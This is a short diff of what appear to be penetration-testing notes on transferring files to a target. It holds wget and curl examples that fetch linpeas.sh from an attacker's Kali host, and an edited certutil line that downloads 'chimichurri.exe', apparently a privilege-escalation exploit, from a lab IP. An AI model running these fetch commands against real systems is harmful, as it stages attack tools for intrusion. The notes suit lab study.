@@ -15,4 +15,4 @@ wget http://\<Kali IP address>/\<filename>
 curl http://\<Kali IP address>/\<filename>
   * example: curl http://192.168.57.5/linpeas.sh
 
-certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+certutil.exe -urlcache -split -f "http://10.10.15.18/chimichurri.exe" chimi.exe
